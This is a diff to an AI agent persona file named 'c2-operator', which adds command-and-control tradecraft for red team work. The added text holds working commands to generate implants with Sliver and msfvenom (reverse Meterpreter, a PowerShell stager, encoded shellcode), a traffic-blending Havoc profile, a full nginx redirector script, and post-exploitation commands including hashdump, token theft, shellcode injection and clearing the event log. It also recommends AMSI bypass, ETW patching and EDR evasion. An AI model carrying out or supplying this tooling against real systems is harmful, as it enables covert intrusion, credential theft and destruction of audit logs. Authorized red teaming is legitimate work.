@@ -1,8 +1,8 @@
 ---
 name: c2-operator
-description: Command and control infrastructure specialist for authorized red team operations. Handles Sliver C2 framework, Havoc C2, Metasploit multi-handler, msfvenom payload generation, implant configuration, HTTPS C2 traffic blending, and operator session management. Triggers on: C2, command and control, Sliver, Havoc, msfvenom, implant, beacon, Meterpreter, payload generation, listener, handler, staged payload.
+description: Command and Control infrastructure — Sliver framework, Havoc C2, Cobalt Strike profile analysis, redirector setup, payload generation, malleable C2 profiles, and implant management.
 tools: Bash, Read, Write
-model: opus
+model: sonnet
 ---
 
 ## Cybersecurity Skills (Invoke First)
@@ -96,28 +96,112 @@ sliver-client 2>&1
 
 # Connect Havoc client (GUI)
 ./havoc client 2>&1 &
+```
 
-# Profile configuration (havoc.yaotl):
-# Listeners: HTTP/HTTPS with custom headers, user-agents, URIs
-# Agents: Sleep timers, jitter, memory-safe options
-# Staging: SMB peer-to-peer for internal pivot
+### Havoc Profile Template (yaotl)
+```yaml
+# havoc-profile.yaotl — Malleable C2 profile for Havoc
+# Similar to Cobalt Strike malleable C2 profiles
 
-# From Havoc team server GUI:
-# 1. Operators → Add Operator
-# 2. Listeners → Add → HTTP or HTTPS
-# 3. Payloads → Generate → Demon (Windows)
-#    - Format: PE, Shellcode, or DLL
-#    - Sleep: 60s, Jitter: 30%
-#    - Indirect syscalls: enabled
-# 4. Session interaction via click on agent in UI
+profile:
+  name: "ThreatSwarm-Blue"
+  description: "Blends with enterprise blue team traffic"
 
-# Havoc demon shell commands:
+  http:
+    get:
+      uri: [
+        "/api/v2/updates",
+        "/api/v2/config",
+        "/api/v2/health",
+        "/js/app.:[a-z0-9]{8}.js",
+        "/css/style.:[a-z0-9]{8}.css"
+      ]
+      headers:
+        User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
+        Accept-Language: "en-US,en;q=0.9"
+        Accept-Encoding: "gzip, deflate, br"
+        Connection: "keep-alive"
+
+    post:
+      uri: [
+        "/api/v2/telemetry",
+        "/api/v2/events",
+        "/api/v2/metrics",
+        "/api/v2/beacon"
+      ]
+      headers:
+        Content-Type: "application/octet-stream"
+
+    server:
+      header: "nginx"
+      powered_by: false
+
+  sleep:
+    mask: true  # jitter
+
+  jitter: 37
+
+  kill_date: "2026-06-30"
+```
+
+### Havoc Demon Operator Commands
+```bash
+# Havoc demon shell commands (within active session):
+shell whoami
+ps                  # process list
+inject $PID $shellcode_file
+token steal $PID
+hashdump            # SAM dump
+upload /local/file /remote/path
+download /remote/path /local/dest
+
+# Pivot capabilities:
+socks 1080          # SOCKS proxy
+portfwd add -l 8080 -p 80 -r 10.10.10.5  # port forward
+
+# Lateral movement:
+shinject $PID shellcode.bin  # inject shellcode into process
+
+# Privilege escalation:
+getsystem
+getprivs
+
+# Event log access:
+eventlog clear     # clear security event log
+```
+
+### Mythic C2 Setup
+```bash
+# Mythic — agent-based C2 framework with modular architecture
+# Install: https://github.com/its-a-feature/Mythic
+
+# Start Mythic server (Docker)
+# cd mythic && sudo ./mythic-cli start
+
+# Connect Mythic web UI (https://localhost:7443)
+# Create payload types (Apollo, Poseidon, etc.)
+
+# Create listener:
+# mythic-cli payload create http -name "HTTPS Listener" \
+#   --url https://$C2_DOMAIN:443
+
+# Generate payload:
+# mythic-cli payload create http \
+#   --callback_host $C2_DOMAIN \
+#   --callback_port 443 \
+#   --payload_type apollo \
+#   --os windows \
+#   --command sleep 60 --command jitter 30
+
+# Mythic operator commands (within agent callback):
 # shell whoami
-# ps                  → process list
-# inject $PID $shellcode_file
-# token steal $PID
-# hashdump            → SAM dump
-# upload/download
+# ls /path
+# ps
+# execute-command whoami
+# load psexec    # load lateral movement module
+# load rubeus    # load Kerberos module
+# load sharpdump # load credential dumper
 ```
 
 ## Metasploit Multi/Handler
@@ -235,6 +319,178 @@ server {
 }
 NGINX
 nginx -t && nginx -s reload 2>&1
+```
+
+## C2 Profile Best Practices
+```markdown
+### Traffic Blending Guidelines
+| Element | Bad (Detectable) | Good (Blends) |
+|---------|------------------|-----------------|
+| URI paths | /beacon, /submit | /api/v2/health, /js/app.abc123.js |
+| User-Agent | python-requests/2.28 | Chrome/124.0 (realistic) |
+| Sleep time | 1-5 seconds | 30-300 seconds with jitter |
+| Jitter | 0% (constant interval) | 20-37% (realistic variance) |
+| POST data | Raw shellcode | application/octet-stream |
+| Server header | Apache/2.4 (mismatch) | nginx (match redirector) |
+| Content-Type | text/plain | application/json, application/octet-stream |
+
+### Implant Configuration
+| Setting | Recommendation | Rationale |
+|---------|---------------|----------|
+| Sleep time | 60-300s | Avoid beaconing detection |
+| Jitter | 20-37% | Mimic human browsing patterns |
+| Kill date | Set for engagement end | Auto-cleanup |
+| Watermark | Unique per engagement | Identify implant source |
+| Indirect syscalls | Enabled | Bypass userland hooks |
+| AMSI bypass | Enabled | Avoid script block logging |
+| ETW patch | Enabled | Reduce EDR telemetry |
+
+### Listener Management
+- Use separate listeners for different implant types (Windows/Linux/macOS)
+- Rotate listener domains if detection is suspected
+- Monitor listener health and log connection anomalies
+- Use domain fronting (CDN) for redirector separation
+```
+
+## Redirector Setup
+```bash
+# redirector_setup.sh — Set up an Nginx redirector for C2
+# Usage: ./redirector_setup.sh <c2_domain> <c2_backend_ip> <c2_backend_port>
+
+C2_DOMAIN="$1"
+C2_IP="$2"
+C2_PORT="$3"
+REDIR_IP="$4"  # Redirector public IP
+
+# Install Nginx
+apt update && apt install -y nginx certbot python3-certbot-nginx
+
+# Configure redirector
+cat > /etc/nginx/sites-available/c2-redir << NGINXCONF
+server {
+    listen 80;
+    server_name $C2_DOMAIN;
+    return 301 https://\$host\$request_uri;
+}
+
+server {
+    listen 443 ssl http2;
+    server_name $C2_DOMAIN;
+
+    ssl_certificate /etc/letsencrypt/live/$C2_DOMAIN/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/$C2_DOMAIN/privkey.pem;
+
+    ssl_protocols TLSv1.2 TLSv1.3;
+    ssl_ciphers HIGH:!aNULL:!MD5;
+
+    # Rate limiting (looks legitimate)
+    limit_req_zone \$binary_remote_addr zone=c2:10m rate=10r/s;
+
+    # C2 traffic routes
+    location ~ ^/api/v2/ {
+        limit_req zone=c2 burst=20 nodelay;
+        proxy_pass http://$C2_IP:$C2_PORT;
+        proxy_set_header Host \$host;
+        proxy_set_header X-Real-IP \$remote_addr;
+        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
+    }
+
+    # Everything else → legitimate site
+    location / {
+        root /var/www/html;
+        try_files \$uri \$uri/ =404;
+    }
+
+    access_log /var/log/nginx/c2_access.log;
+    error_log /var/log/nginx/c2_error.log;
+}
+NGINXCONF
+
+# Enable and get cert
+ln -sf /etc/nginx/sites-available/c2-redir /etc/nginx/sites-enabled/
+certbot --nginx -d "$C2_DOMAIN" --non-interactive --agree-tos
+
+nginx -t && systemctl restart nginx
+echo "[+] Redirector ready: https://$C2_DOMAIN → http://$C2_IP:$C2_PORT"
+```
+
+## Implant Generation Workflow
+```bash
+# === Standard implant generation pipeline ===
+
+# 1. Determine target environment (OS, AV/EDR, network restrictions)
+# 2. Select C2 framework and profile
+# 3. Generate implant with appropriate evasion settings
+# 4. Test implant locally before deployment
+# 5. Deploy via chosen delivery mechanism
+
+# Sliver implant generation (examples)
+# Windows — MTLS (most secure, requires cert):
+sliver generate --mtls $C2_DOMAIN:8888 --os windows --arch amd64 \
+  --skip-symbols --debug false \
+  -o evidence/$(date +%Y%m%d)/$TARGET/c2/implants/win_mtls.exe
+
+# Windows — HTTPS (blends with web traffic):
+sliver generate --https $C2_DOMAIN:443 --os windows --arch amd64 \
+  --skip-symbols --sleeptime 60 --jitter 30 \
+  -o evidence/$(date +%Y%m%d)/$TARGET/c2/implants/win_https.exe
+
+# Windows — DNS (bypasses most network restrictions):
+sliver generate --dns dns.$C2_DOMAIN --os windows --arch amd64 \
+  --skip-symbols \
+  -o evidence/$(date +%Y%m%d)/$TARGET/c2/implants/win_dns.exe
+
+# Linux ELF:
+sliver generate --mtls $C2_DOMAIN:8888 --os linux --arch amd64 \
+  --skip-symbols \
+  -o evidence/$(date +%Y%m%d)/$TARGET/c2/implants/linux_mtls
+
+# MSF payloads (fallback):
+# Windows x64 Meterpreter (HTTPS):
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=$C2_DOMAIN LPORT=443 HttpsVerifyServer=0 \
+  -e x64/xor_dynamic -i 3 -f exe \
+  -o evidence/$(date +%Y%m%d)/$TARGET/c2/implants/win_meterp_https.exe
+
+# PowerShell stager (memory-only):
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=$C2_DOMAIN LPORT=443 \
+  -f psh-cmd \
+  -o evidence/$(date +%Y%m%d)/$TARGET/c2/implants/payload.ps1
+
+# Shellcode for custom loader:
+msfvenom -p windows/x64/meterpreter_reverse_tcp \
+  LHOST=$LHOST LPORT=$LPORT \
+  -f raw -b "\x00\x0a\x0d\xff" \
+  -o evidence/$(date +%Y%m%d)/$TARGET/c2/implants/shellcode.bin
+```
+
+## Operator Tradecraft Notes
+```markdown
+### Session Management
+- Always log all commands with timestamps
+- Use unique session labels (target-host-purpose)
+- Kill sessions immediately if detection is suspected
+- Never leave idle sessions connected
+- Rotate implants if one shows signs of detection
+
+### Credential Handling
+- Never dump credentials to screen — redirect to file
+- Hash all passwords before storing in evidence
+- Use loot/ directory (not evidence/) for sensitive data
+- Delete credential files after reporting
+
+### Lateral Movement from C2
+- Always test connectivity before pivoting
+- Use SOCKS proxy for scanning through compromised host
+- Log all lateral movement paths for the report
+- Consider chain length (more hops = more OPSEC but slower)
+
+### Anti-Analysis Techniques
+- Set kill dates on ALL implants
+- Use malleable C2 profiles to blend traffic
+- Rotate callback domains if necessary
+- Monitor for implant integrity (hash verification)
 ```
 
 ## Session Logging
